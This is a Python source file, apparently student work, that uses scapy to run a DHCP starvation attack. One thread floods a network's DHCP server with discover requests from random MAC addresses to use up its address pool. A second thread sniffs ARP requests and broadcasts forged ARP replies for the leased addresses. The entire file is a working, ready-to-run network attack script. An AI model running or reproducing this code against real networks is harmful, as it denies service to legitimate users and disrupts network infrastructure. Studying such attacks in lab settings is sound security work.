# all of this code was written by Samer Saade
from scapy.all import * # need to import the scapy library to create custom packets
import time # need time to not send all at once and make high traffic on the interface
import random # needed this library to not specify the exact time needed
import threading # needed this library because i want to have the program listening for the traffic at the same time also executing the attack
#references: https://www.techtarget.com/searchnetworking/definition/BOOTP, https://www.geeksforgeeks.org/packet-sniffing-using-scapy/, https://denizhalil.com/2024/09/07/arp-sniffing-scapy/, https://scapy.readthedocs.io/en/latest/, used chatgpt for the part of multithreading 


arp_event = threading.Event() # this is used for the event trigering to order the threads
conf.checkIPaddr = False # this line is used to turn off checking IP, so when we send traffic to the specifc IP address is not the one that needs to reply 
IP_to_Mac = {} # this is a dictionnary to store up the offered IPs with there corresponding MAC addresses
# Creating now the DHCP discover packet
# here we initializing with Ether the layer 2 destination mac address is all Fs which means a broadcast message and source mac is a rand mac
# Next is the IP address, well we don't have in the begining any IP so it set to all 0s and the destinations also 255s to flood the entire network
def dhcp_star():
    while True:
        random_sleep_time = random.uniform(1, 5)
        time.sleep(random_sleep_time)
        generated_mac = RandMAC()
        mac_readable = mac2str(generated_mac)
        discover_packet=  Ether(dst='ff:ff:ff:ff:ff:ff', src= mac2str(RandMAC()), type=0x0800) \
                         /IP(src='0.0.0.0',dst='255.255.255.255') \
                         /UDP(sport=68,dport=67) \
                         /BOOTP(op=1,chaddr=mac_readable) \
                         /DHCP(options=[('message-type','discover'),('end')])
        offer_packet = srp1(discover_packet, iface='eth0', verbose =0) # here this function is to send and the receive the packet response

        if offer_packet:
            if DHCP in offer_packet:
                offered_IP = offer_packet[BOOTP].yiaddr # this is the IP that the DHCP server has given us
                offered_mac = offer_packet[BOOTP].chaddr # Getting the mac address in the bootp in the packet 
                offered_mac = ':'.join(format(x, '02x') for x in offered_mac[:6]) #making it human readable
                IP_to_Mac[offered_IP] = offered_mac # Putting it in the dictionnary so we can generate an ARP reply 
                print(f"Ip address {offered_IP} allocated to the corresponding MAC:{offered_mac}")
                arp_event.set() # wait for the second thread to capture the ARP request
                time.sleep(10)

# now i will start the sniffer 
def arp_reply_handler(packet):
    if packet[ARP].op==1: # if the arp message is a request message 
        # setting up the fileds for arp reply 
        d_ip = packet[ARP].psrc # get the source ip from which the request message has been issued
        src_ip = packet[ARP].pdst
        src_mac = IP_to_Mac[src_ip]
        dst_mac = "ff:ff:ff:ff:ff:ff" # I tried sending it to target mac but broadcasting made it work
        arp_reply = (Ether(dst=dst_mac, src=src_mac) / # creating the ARP reply and making it broadcast
                    ARP(op=2,hwsrc =src_mac, psrc=src_ip, hwdst=dst_mac, pdst=d_ip))
        print(f"sending ARP reply message to {d_ip} with following MAC:{src_mac}")
        sendp(arp_reply,iface='eth0')

# we need to create the sniffing function part  
def SNIF():
	arp_event.wait() # waiting for the event when we have the DHCP offer packet 
	sniff(iface='eth0', filter="arp", prn=arp_reply_handler, store=0) # creating the sniffer and specifying the filter that we only want arp packets to be captured and setting the corresponding interface

arp_thread = threading.Thread(target=SNIF,daemon=True) # creating the first thread for the listener 
dhcp_attack_thread = threading.Thread(target=dhcp_star, daemon=True)   # the second thread for the attack 
dhcp_attack_thread.start()
arp_thread.start()
# needed to add this while loop so the main thread of the program doesn't exit 
while True:
    time.sleep(1)
